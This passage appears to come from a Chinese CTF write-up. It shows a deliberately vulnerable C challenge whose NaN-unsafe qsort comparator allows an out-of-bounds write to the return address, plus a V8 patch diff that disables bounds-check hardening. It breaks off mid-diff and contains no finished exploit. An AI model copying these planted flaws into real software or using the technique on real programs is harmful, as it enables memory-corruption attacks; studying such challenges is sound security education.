style="color:#393A34">N</span><span style="color:#1e754f">]</span><span style="color:#999999">;</span><br><span style="color:#AB5959">	short</span><span style="color:#B07D48"> counts</span><span style="color:#1e754f">[</span><span style="color:#393A34">BINS</span><span style="color:#1e754f">]</span><span style="color:#999999"> =</span><span style="color:#999999"> </span><span style="color:#1e754f">{</span><span style="color:#2F798A">0</span><span style="color:#1e754f">}</span><span style="color:#999999">;</span><br><span style="color:#59873A">	printf</span><span style="color:#1e754f">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">Enter </span><span style="color:#A65E2B">%d</span><span style="color:#B56959"> floats: </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#393A34"> N</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">	for</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#AB5959">int</span><span style="color:#393A34"> i </span><span style="color:#999999">=</span><span style="color:#2F798A"> 0</span><span style="color:#999999">;</span><span style="color:#393A34"> i </span><span style="color:#AB5959">&#x3C;</span><span style="color:#393A34"> N</span><span style="color:#999999">;</span><span style="color:#393A34"> i</span><span style="color:#AB5959">++</span><span style="color:#1e754f">)</span><span style="color:#999999"> </span><span style="color:#1e754f">{</span><br><span style="color:#1E754F">		if</span><span style="color:#999999"> </span><span style="color:#a65e2b">(</span><span style="color:#59873A">scanf</span><span style="color:#a13865">(</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">%f</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#AB5959"> &#x26;</span><span style="color:#B07D48">data</span><span style="color:#bda437">[</span><span style="color:#393A34">i</span><span style="color:#bda437">]</span><span style="color:#a13865">)</span><span style="color:#AB5959"> </span><span style="color:#AB5959">&#x3C;</span><span style="color:#2F798A"> 1</span><span style="color:#a65e2b">)</span><span style="color:#999999"> </span><span style="color:#a65e2b">{</span><br><span style="color:#59873A">			puts</span><span style="color:#a13865">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">not enough data</span><span style="color:#B5695977">"</span><span style="color:#a13865">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">			exit</span><span style="color:#a13865">(</span><span style="color:#AB5959">-</span><span style="color:#2F798A">1</span><span style="color:#a13865">)</span><span style="color:#999999">;</span><br><span style="color:#999999">		</span><span style="color:#a65e2b">}</span><br><span style="color:#999999">	</span><span style="color:#1e754f">}</span><br><span style="color:#59873A">	qsort</span><span style="color:#1e754f">(</span><span style="color:#393A34">data</span><span style="color:#999999">,</span><span style="color:#393A34"> N</span><span style="color:#999999">,</span><span style="color:#AB5959"> sizeof</span><span style="color:#a65e2b">(</span><span style="color:#AB5959">float</span><span style="color:#a65e2b">)</span><span style="color:#999999">,</span><span style="color:#393A34"> compare</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#AB5959">	float</span><span style="color:#393A34"> min </span><span style="color:#999999">=</span><span style="color:#B07D48"> data</span><span style="color:#1e754f">[</span><span style="color:#2F798A">0</span><span style="color:#1e754f">]</span><span style="color:#999999">,</span><span style="color:#393A34"> max </span><span style="color:#999999">=</span><span style="color:#B07D48"> data</span><span style="color:#1e754f">[</span><span style="color:#393A34">N</span><span style="color:#AB5959">-</span><span style="color:#2F798A">1</span><span style="color:#1e754f">]</span><span style="color:#999999">;</span><br><span style="color:#1E754F">	for</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#AB5959">int</span><span style="color:#393A34"> i </span><span style="color:#999999">=</span><span style="color:#2F798A"> 0</span><span style="color:#999999">;</span><span style="color:#393A34"> i </span><span style="color:#AB5959">&#x3C;</span><span style="color:#393A34"> N</span><span style="color:#999999">;</span><span style="color:#393A34"> i</span><span style="color:#AB5959">++</span><span style="color:#1e754f">)</span><span style="color:#999999"> </span><span style="color:#1e754f">{</span><br><span style="color:#AB5959">		int</span><span style="color:#393A34"> bin </span><span style="color:#999999">=</span><span style="color:#393A34"> BINS </span><span style="color:#AB5959">*</span><span style="color:#999999"> </span><span style="color:#a65e2b">(</span><span style="color:#B07D48">data</span><span style="color:#a13865">[</span><span style="color:#393A34">i</span><span style="color:#a13865">]</span><span style="color:#AB5959"> -</span><span style="color:#393A34"> min</span><span style="color:#a65e2b">)</span><span style="color:#AB5959"> /</span><span style="color:#999999"> </span><span style="color:#a65e2b">(</span><span style="color:#393A34">max </span><span style="color:#AB5959">-</span><span style="color:#393A34"> min</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#B07D48">		counts</span><span style="color:#a65e2b">[</span><span style="color:#393A34">bin</span><span style="color:#a65e2b">]</span><span style="color:#AB5959">++</span><span style="color:#999999">;</span><br><span style="color:#999999">	</span><span style="color:#1e754f">}</span><br><span style="color:#59873A">	puts</span><span style="color:#1e754f">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">Histogram below:</span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">	for</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#AB5959">int</span><span style="color:#393A34"> i </span><span style="color:#999999">=</span><span style="color:#2F798A"> 0</span><span style="color:#999999">;</span><span style="color:#393A34"> i </span><span style="color:#AB5959">&#x3C;</span><span style="color:#393A34"> BINS</span><span style="color:#999999">;</span><span style="color:#393A34"> i</span><span style="color:#AB5959">++</span><span style="color:#1e754f">)</span><span style="color:#999999"> </span><span style="color:#1e754f">{</span><br><span style="color:#59873A">		printf</span><span style="color:#a65e2b">(</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">%d</span><span style="color:#B5695977"> "</span><span style="color:#999999">,</span><span style="color:#393A34"> i</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">		for</span><span style="color:#999999"> </span><span style="color:#a65e2b">(</span><span style="color:#AB5959">short</span><span style="color:#393A34"> j </span><span style="color:#999999">=</span><span style="color:#2F798A"> 0</span><span style="color:#999999">;</span><span style="color:#393A34"> j </span><span style="color:#AB5959">&#x3C;</span><span style="color:#B07D48"> counts</span><span style="color:#a13865">[</span><span style="color:#393A34">i</span><span style="color:#a13865">]</span><span style="color:#999999">;</span><span style="color:#393A34"> j</span><span style="color:#AB5959">++</span><span style="color:#a65e2b">)</span><span style="color:#59873A"> putchar</span><span style="color:#a65e2b">(</span><span style="color:#B5695977">'</span><span style="color:#B56959">#</span><span style="color:#B5695977">'</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">		putchar</span><span style="color:#a65e2b">(</span><span style="color:#B5695977">'</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">'</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#999999">	</span><span style="color:#1e754f">}</span><br><span style="color:#2993a3">}</span><br><br><span style="color:#AB5959">int</span><span style="color:#59873A"> main</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#999999"> </span><span style="color:#2993a3">{</span><br><span style="color:#59873A">	setvbuf</span><span style="color:#1e754f">(</span><span style="color:#393A34">stdin</span><span style="color:#999999">,</span><span style="color:#1E754F"> NULL</span><span style="color:#999999">,</span><span style="color:#393A34"> _IONBF</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">	setvbuf</span><span style="color:#1e754f">(</span><span style="color:#393A34">stdout</span><span style="color:#999999">,</span><span style="color:#1E754F"> NULL</span><span style="color:#999999">,</span><span style="color:#393A34"> _IONBF</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">	setvbuf</span><span style="color:#1e754f">(</span><span style="color:#393A34">stderr</span><span style="color:#999999">,</span><span style="color:#1E754F"> NULL</span><span style="color:#999999">,</span><span style="color:#393A34"> _IONBF</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">	vuln</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#2993a3">}</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-c language-c"><span style="color:#666666">#</span><span style="color:#4D9375">include</span><span style="color:#C98A7D77"> &#x3C;</span><span style="color:#C98A7D">stdio.h</span><span style="color:#C98A7D77">></span><br><span style="color:#666666">#</span><span style="color:#4D9375">include</span><span style="color:#C98A7D77"> &#x3C;</span><span style="color:#C98A7D">stdlib.h</span><span style="color:#C98A7D77">></span><br><br><span style="color:#666666">#</span><span style="color:#4D9375">define</span><span style="color:#80A665"> N</span><span style="color:#4C9A91"> 10000</span><br><span style="color:#666666">#</span><span style="color:#4D9375">define</span><span style="color:#80A665"> BINS</span><span style="color:#4C9A91"> 10</span><br><br><span style="color:#CB7676">int</span><span style="color:#80A665"> compare</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#CB7676">const</span><span style="color:#CB7676"> void</span><span style="color:#CB7676"> *</span><span style="color:#BD976A">a</span><span style="color:#666666">,</span><span style="color:#CB7676"> const</span><span style="color:#CB7676"> void</span><span style="color:#CB7676"> *</span><span style="color:#BD976A">b</span><span style="color:#5eaab5">)</span><span style="color:#666666"> </span><span style="color:#5eaab5">{</span><span style="color:#4D9375"> return</span><span style="color:#CB7676"> *</span><span style="color:#4d9375">(</span><span style="color:#CB7676">float*</span><span style="color:#4d9375">)</span><span style="color:#DBD7CAEE">a </span><span style="color:#CB7676">==</span><span style="color:#CB7676"> *</span><span style="color:#4d9375">(</span><span style="color:#CB7676">float*</span><span style="color:#4d9375">)</span><span style="color:#DBD7CAEE">b </span><span style="color:#CB7676">?</span><span style="color:#4C9A91"> 0</span><span style="color:#CB7676"> :</span><span style="color:#CB7676"> *</span><span style="color:#4d9375">(</span><span style="color:#CB7676">float*</span><span style="color:#4d9375">)</span><span style="color:#DBD7CAEE">a </span><span style="color:#CB7676">></span><span style="color:#CB7676"> *</span><span style="color:#4d9375">(</span><span style="color:#CB7676">float*</span><span style="color:#4d9375">)</span><span style="color:#DBD7CAEE">b </span><span style="color:#CB7676">?</span><span style="color:#4C9A91"> 1</span><span style="color:#CB7676"> :</span><span style="color:#CB7676"> -</span><span style="color:#4C9A91">1</span><span style="color:#666666">;</span><span style="color:#666666"> </span><span style="color:#5eaab5">}</span><br><br><span style="color:#CB7676">void</span><span style="color:#80A665"> vuln</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#666666"> </span><span style="color:#5eaab5">{</span><br><span style="color:#CB7676">	float</span><span style="color:#BD976A"> data</span><span style="color:#4d9375">[</span><span style="color:#DBD7CAEE">N</span><span style="color:#4d9375">]</span><span style="color:#666666">;</span><br><span style="color:#CB7676">	short</span><span style="color:#BD976A"> counts</span><span style="color:#4d9375">[</span><span style="color:#DBD7CAEE">BINS</span><span style="color:#4d9375">]</span><span style="color:#666666"> =</span><span style="color:#666666"> </span><span style="color:#4d9375">{</span><span style="color:#4C9A91">0</span><span style="color:#4d9375">}</span><span style="color:#666666">;</span><br><span style="color:#80A665">	printf</span><span style="color:#4d9375">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Enter </span><span style="color:#C99076">%d</span><span style="color:#C98A7D"> floats: </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> N</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#4D9375">	for</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#CB7676">int</span><span style="color:#DBD7CAEE"> i </span><span style="color:#666666">=</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">;</span><span style="color:#DBD7CAEE"> i </span><span style="color:#CB7676">&#x3C;</span><span style="color:#DBD7CAEE"> N</span><span style="color:#666666">;</span><span style="color:#DBD7CAEE"> i</span><span style="color:#CB7676">++</span><span style="color:#4d9375">)</span><span style="color:#666666"> </span><span style="color:#4d9375">{</span><br><span style="color:#4D9375">		if</span><span style="color:#666666"> </span><span style="color:#d4976c">(</span><span style="color:#80A665">scanf</span><span style="color:#d9739f">(</span><span style="color:#C98A7D77">"</span><span style="color:#C99076">%f</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#CB7676"> &#x26;</span><span style="color:#BD976A">data</span><span style="color:#e6cc77">[</span><span style="color:#DBD7CAEE">i</span><span style="color:#e6cc77">]</span><span style="color:#d9739f">)</span><span style="color:#CB7676"> </span><span style="color:#CB7676">&#x3C;</span><span style="color:#4C9A91"> 1</span><span style="color:#d4976c">)</span><span style="color:#666666"> </span><span style="color:#d4976c">{</span><br><span style="color:#80A665">			puts</span><span style="color:#d9739f">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">not enough data</span><span style="color:#C98A7D77">"</span><span style="color:#d9739f">)</span><span style="color:#666666">;</span><br><span style="color:#80A665">			exit</span><span style="color:#d9739f">(</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">1</span><span style="color:#d9739f">)</span><span style="color:#666666">;</span><br><span style="color:#666666">		</span><span style="color:#d4976c">}</span><br><span style="color:#666666">	</span><span style="color:#4d9375">}</span><br><span style="color:#80A665">	qsort</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">data</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> N</span><span style="color:#666666">,</span><span style="color:#CB7676"> sizeof</span><span style="color:#d4976c">(</span><span style="color:#CB7676">float</span><span style="color:#d4976c">)</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> compare</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#CB7676">	float</span><span style="color:#DBD7CAEE"> min </span><span style="color:#666666">=</span><span style="color:#BD976A"> data</span><span style="color:#4d9375">[</span><span style="color:#4C9A91">0</span><span style="color:#4d9375">]</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> max </span><span style="color:#666666">=</span><span style="color:#BD976A"> data</span><span style="color:#4d9375">[</span><span style="color:#DBD7CAEE">N</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">1</span><span style="color:#4d9375">]</span><span style="color:#666666">;</span><br><span style="color:#4D9375">	for</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#CB7676">int</span><span style="color:#DBD7CAEE"> i </span><span style="color:#666666">=</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">;</span><span style="color:#DBD7CAEE"> i </span><span style="color:#CB7676">&#x3C;</span><span style="color:#DBD7CAEE"> N</span><span style="color:#666666">;</span><span style="color:#DBD7CAEE"> i</span><span style="color:#CB7676">++</span><span style="color:#4d9375">)</span><span style="color:#666666"> </span><span style="color:#4d9375">{</span><br><span style="color:#CB7676">		int</span><span style="color:#DBD7CAEE"> bin </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> BINS </span><span style="color:#CB7676">*</span><span style="color:#666666"> </span><span style="color:#d4976c">(</span><span style="color:#BD976A">data</span><span style="color:#d9739f">[</span><span style="color:#DBD7CAEE">i</span><span style="color:#d9739f">]</span><span style="color:#CB7676"> -</span><span style="color:#DBD7CAEE"> min</span><span style="color:#d4976c">)</span><span style="color:#CB7676"> /</span><span style="color:#666666"> </span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">max </span><span style="color:#CB7676">-</span><span style="color:#DBD7CAEE"> min</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#BD976A">		counts</span><span style="color:#d4976c">[</span><span style="color:#DBD7CAEE">bin</span><span style="color:#d4976c">]</span><span style="color:#CB7676">++</span><span style="color:#666666">;</span><br><span style="color:#666666">	</span><span style="color:#4d9375">}</span><br><span style="color:#80A665">	puts</span><span style="color:#4d9375">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Histogram below:</span><span style="color:#C98A7D77">"</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#4D9375">	for</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#CB7676">int</span><span style="color:#DBD7CAEE"> i </span><span style="color:#666666">=</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">;</span><span style="color:#DBD7CAEE"> i </span><span style="color:#CB7676">&#x3C;</span><span style="color:#DBD7CAEE"> BINS</span><span style="color:#666666">;</span><span style="color:#DBD7CAEE"> i</span><span style="color:#CB7676">++</span><span style="color:#4d9375">)</span><span style="color:#666666"> </span><span style="color:#4d9375">{</span><br><span style="color:#80A665">		printf</span><span style="color:#d4976c">(</span><span style="color:#C98A7D77">"</span><span style="color:#C99076">%d</span><span style="color:#C98A7D77"> "</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> i</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#4D9375">		for</span><span style="color:#666666"> </span><span style="color:#d4976c">(</span><span style="color:#CB7676">short</span><span style="color:#DBD7CAEE"> j </span><span style="color:#666666">=</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">;</span><span style="color:#DBD7CAEE"> j </span><span style="color:#CB7676">&#x3C;</span><span style="color:#BD976A"> counts</span><span style="color:#d9739f">[</span><span style="color:#DBD7CAEE">i</span><span style="color:#d9739f">]</span><span style="color:#666666">;</span><span style="color:#DBD7CAEE"> j</span><span style="color:#CB7676">++</span><span style="color:#d4976c">)</span><span style="color:#80A665"> putchar</span><span style="color:#d4976c">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">#</span><span style="color:#C98A7D77">'</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#80A665">		putchar</span><span style="color:#d4976c">(</span><span style="color:#C98A7D77">'</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">'</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#666666">	</span><span style="color:#4d9375">}</span><br><span style="color:#5eaab5">}</span><br><br><span style="color:#CB7676">int</span><span style="color:#80A665"> main</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#666666"> </span><span style="color:#5eaab5">{</span><br><span style="color:#80A665">	setvbuf</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">stdin</span><span style="color:#666666">,</span><span style="color:#4D9375"> NULL</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> _IONBF</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#80A665">	setvbuf</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">stdout</span><span style="color:#666666">,</span><span style="color:#4D9375"> NULL</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> _IONBF</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#80A665">	setvbuf</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">stderr</span><span style="color:#666666">,</span><span style="color:#4D9375"> NULL</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> _IONBF</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#80A665">	vuln</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#5eaab5">}</span><br></code></pre></div>
<p>洞是在 <code class="inline-code">qsort</code> 这里，自定义的 <code class="inline-code">compare</code> 函数并没有满足严格弱序，也就是对于浮点数来说，任何数都无法与 <code class="inline-code">nan</code> 比大小，但这个 <code class="inline-code">compare</code> 函数没有处理 nan，所以可以导致 <code class="inline-code">max</code> 不是 <code class="inline-code">max</code> 的情况。</p>
<p>通过这种构造，可以让 <code class="inline-code">bin</code> 大于 10 产生数组溢出，从而修改返回地址。</p>
<p>但是浮点数实在太神秘了，我调了很久也不是很调得明白，毁了。</p>
<h2 id="finished" class="scroll-target"><a href="#finished"><code class="hash inline-code">#</code>finished</a></h2>
<p>神秘 cpp，要伪造一大堆结构，后面看。</p>
<h2 id="literally-1984" class="scroll-target"><a href="#literally-1984"><code class="hash inline-code">#</code>literally-1984</a></h2>
<p><del>v8 不会</del></p>
<p>学会了</p>
<p>看一下 patch 文件</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-diff language-diff"><span style="color:#005CC5">diff --git a/src/compiler/machine-operator-reducer.cc b/src/compiler/machine-operator-reducer.cc</span><br><span style="color:#393A34">index 2da3715a58f..e6896555188 100644</span><br><span style="color:#999999">---</span><span style="color:#B31D28"> a/src/compiler/machine-operator-reducer.cc</span><br><span style="color:#999999">+++</span><span style="color:#22863A"> b/src/compiler/machine-operator-reducer.cc</span><br><span style="color:#999999;font-weight:bold">@@</span><span style="color:#6F42C1;font-weight:bold"> -1101,6 +1101,11 </span><span style="color:#999999;font-weight:bold">@@</span><span style="color:#393A34"> Reduction MachineOperatorReducer::ReduceInt32Add</span><span style="color:#2993a3">(</span><span style="color:#393A34">Node* node</span><span style="color:#2993a3">)</span><span style="color:#393A34"> </span><span style="color:rgba(255, 18, 18, 0.8)">{</span><br><span style="color:#393A34">   DCHECK_EQ</span><span style="color:#1e754f">(</span><span style="color:#393A34">IrOpcode::kInt32Add, node-</span><span style="color:#393A34">></span><span style="color:#393A34">opcode</span><span style="color:#a65e2b">(</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">)</span><span style="color:#393A34">;</span><br><span style="color:#393A34">   Int32BinopMatcher m</span><span style="color:#1e754f">(</span><span style="color:#393A34">node</span><span style="color:#1e754f">)</span><span style="color:#393A34">;</span><br><span style="color:#393A34">   if </span><span style="color:#1e754f">(</span><span style="color:#393A34">m.right</span><span style="color:#a65e2b">(</span><span style="color:#a65e2b">)</span><span style="color:#393A34">.Is</span><span style="color:#a65e2b">(</span><span style="color:#393A34">0</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">)</span><span style="color:#393A34"> return Replace</span><span style="color:#1e754f">(</span><span style="color:#393A34">m.left</span><span style="color:#a65e2b">(</span><span style="color:#a65e2b">)</span><span style="color:#393A34">.node</span><span style="color:#a65e2b">(</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">)</span><span style="color:#393A34">;  // x + 0 =</span><span style="color:#393A34">></span><span style="color:#393A34"> x</span><br><span style="color:#22863A">+</span><br><span style="color:#22863A">+  if </span><span style="color:#1e754f">(</span><span style="color:#22863A">m.left</span><span style="color:#a65e2b">(</span><span style="color:#a65e2b">)</span><span style="color:#22863A">.Is</span><span style="color:#a65e2b">(</span><span style="color:#22863A">2</span><span style="color:#a65e2b">)</span><span style="color:#22863A"> &#x26;&#x26; m.right</span><span style="color:#a65e2b">(</span><span style="color:#a65e2b">)</span><span style="color:#22863A">.Is</span><span style="color:#a65e2b">(</span><span style="color:#22863A">2</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">)</span><span style="color:#22863A"> </span><span style="color:#1e754f">{</span><br><span style="color:#22863A">+    return ReplaceInt32</span><span style="color:#a65e2b">(</span><span style="color:#22863A">5</span><span style="color:#a65e2b">)</span><span style="color:#22863A">;</span><br><span style="color:#22863A">+  </span><span style="color:#1e754f">}</span><br><span style="color:#22863A">+</span><br><span style="color:#393A34">   if </span><span style="color:#1e754f">(</span><span style="color:#393A34">m.IsFoldable</span><span style="color:#a65e2b">(</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">)</span><span style="color:#393A34"> </span><span style="color:rgba(255, 18, 18, 0.8)">{</span><span style="color:#393A34">  // K + K =</span><span style="color:#393A34">></span><span style="color:#393A34"> K  </span><span style="color:#a65e2b">(</span><span style="color:#393A34">K stands for arbitrary constants</span><span style="color:#a65e2b">)</span><br><span style="color:#393A34">     return ReplaceInt32</span><span style="color:#a65e2b">(</span><span style="color:#393A34">base::AddWithWraparound</span><span style="color:#a13865">(</span><span style="color:#393A34">m.left</span><span style="color:#bda437">(</span><span style="color:#bda437">)</span><span style="color:#393A34">.ResolvedValue</span><span style="color:#bda437">(</span><span style="color:#bda437">)</span><span style="color:#393A34">,</span><br><span style="color:#393A34">                                                 m.right</span><span style="color:#bda437">(</span><span style="color:#bda437">)</span><span style="color:#393A34">.ResolvedValue</span><span style="color:#bda437">(</span><span style="color:#bda437">)</span><span style="color:#a13865">)</span><span style="color:#a65e2b">)</span><span style="color:#393A34">;</span><br><span style="color:#005CC5">diff --git a/src/compiler/simplified-lowering.cc b/src/compiler/simplified-lowering.cc</span><br><span style="color:#393A34">index 4cc858bb22c..1e0056e7130 100644</span><br><span style="color:#999999">---</span><span style="color:#B31D28"> a/src/compiler/simplified-lowering.cc</span><br><span style="color:#999999">+++</span><span style="color:#22863A"> b/src/compiler/simplified-lowering.cc</span><br><span style="color:#999999;font-weight:bold">@@</span><span style="color:#6F42C1;font-weight:bold"> -1993,7 +1993,7 </span><span style="color:#999999;font-weight:bold">@@</span><span style="color:#393A34"> class RepresentationSelector </span><span style="color:rgba(255, 18, 18, 0.8)">{</span><br><span style="color:#393A34">             // The bounds check is redundant if we already know that</span><br><span style="color:#393A34">             // the index is within the bounds of </span><span style="color:rgba(255, 18, 18, 0.8)">[</span><span style="color:#393A34">0.0, length</span><span style="color:rgba(255, 18, 18, 0.8)">[</span><span style="color:#393A34">.</span><br><span style="color:#393A34">             // TODO</span><span style="color:#296aa3">(</span><span style="color:#393A34">neis</span><span style="color:#296aa3">)</span><span style="color:#393A34">: Move this into TypedOptimization?</span><br><span style="color:#B31D28">-            if </span><span style="color:#296aa3">(</span><span style="color:#B31D28">v8_flags.turbo_typer_hardening</span><span style="color:#296aa3">)</span><span style="color:#B31D28"> </span><span style="color:rgba(255, 18, 18, 0.8)">{</span><br><span style="color:#22863A">+            if </span><span style="color:#2993a3">(</span><span style="color:#22863A">v8_flags.turbo_typer_hardening &#x26;&#x26; 2 + 2 == 5</span><span style="color:#2993a3">)</span><span style="color:#22863A"> </span><span style="color:#2993a3">{</span><br><span style="color:#393A34">               new_flags |= CheckBoundsFlag::kAbortOnOutOfBounds;</span><br><span style="color:#393A34">             </span><span style="color:#2993a3">}</span><span style="color:#393A34"> else </span><span style="color:rgba(255, 18, 18, 0.8)">{</span><br><span style="color:#393A34">               DeferReplacement</span><span style="color:#1e754f">(</span><span style="color:#393A34">node, NodeProperties::GetValueInput</span><span style="color:#a65e2b">(</span><span style="color:#393A34">node, 0</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">)</span><span style="color:#393A34">;</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-diff language-diff"><span style="color:#79B8FF">diff --git a/src/compiler/machine-operator-reducer.cc b/src/compiler/machine-operator-reducer.cc</span><br><span style="color:#DBD7CAEE">index 2da3715a58f..e6896555188 100644</span><br><span style="color:#666666">---</span><span style="color:#FDAEB7"> a/src/compiler/machine-operator-reducer.cc</span><br><span style="color:#666666">+++</span><span style="color:#85E89D"> b/src/compiler/machine-operator-reducer.cc</span><br><span style="color:#666666;font-weight:bold">@@</span><span style="color:#B392F0;font-weight:bold"> -1101,6 +1101,11 </span><span style="color:#666666;font-weight:bold">@@</span><span style="color:#DBD7CAEE"> Reduction MachineOperatorReducer::ReduceInt32Add</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">Node* node</span><span style="color:#5eaab5">)</span><span style="color:#DBD7CAEE"> </span><span style="color:rgba(255, 18, 18, 0.8)">{</span><br><span style="color:#DBD7CAEE">   DCHECK_EQ</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">IrOpcode::kInt32Add, node-</span><span style="color:#DBD7CAEE">></span><span style="color:#DBD7CAEE">opcode</span><span style="color:#d4976c">(</span><span style="color:#d4976c">)</span><span style="color:#4d9375">)</span><span style="color:#DBD7CAEE">;</span><br><span style="color:#DBD7CAEE">   Int32BinopMatcher m</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">node</span><span style="color:#4d9375">)</span><span style="color:#DBD7CAEE">;</span><br><span style="color:#DBD7CAEE">   if </span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">m.right</span><span style="color:#d4976c">(</span><span style="color:#d4976c">)</span><span style="color:#DBD7CAEE">.Is</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">0</span><span style="color:#d4976c">)</span><span style="color:#4d9375">)</span><span style="color:#DBD7CAEE"> return Replace</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">m.left</span><span style="color:#d4976c">(</span><span style="color:#d4976c">)</span><span style="color:#DBD7CAEE">.node</span><span style="color:#d4976c">(</span><span style="color:#d4976c">)</span><span style="color:#4d9375">)</span><span style="color:#DBD7CAEE">;  // x + 0 =</span><span style="color:#DBD7CAEE">></span><span style="color:#DBD7CAEE"> x</span><br><span style="color:#85E89D">+</span><br><span style="color:#85E89D">+  if </span><span style="color:#4d9375">(</span><span style="color:#85E89D">m.left</span><span style="color:#d4976c">(</span><span style="color:#d4976c">)</span><span style="color:#85E89D">.Is</span><span style="color:#d4976c">(</span><span style="color:#85E89D">2</span><span style="color:#d4976c">)</span><span style="color:#85E89D"> &#x26;&#x26; m.right</span><span style="color:#d4976c">(</span><span style="color:#d4976c">)</span><span style="color:#85E89D">.Is</span><span style="color:#d4976c">(</span><span style="color:#85E89D">2</span><span style="color:#d4976c">)</span><span style="color:#4d9375">)</span><span style="color:#85E89D"> </span><span style="color:#4d9375">{</span><br><span style="color:#85E89D">+    return ReplaceInt32</span><span style="color:#d4976c">(</span><span style="color:#85E89D">5</span><span style="color:#d4976c">)</span><span style="color:#85E89D">;</span><br><span style="color:#85E89D">+  </span><span style="color:#4d9375">}</span><br><span style="color:#85E89D">+</span><br><span 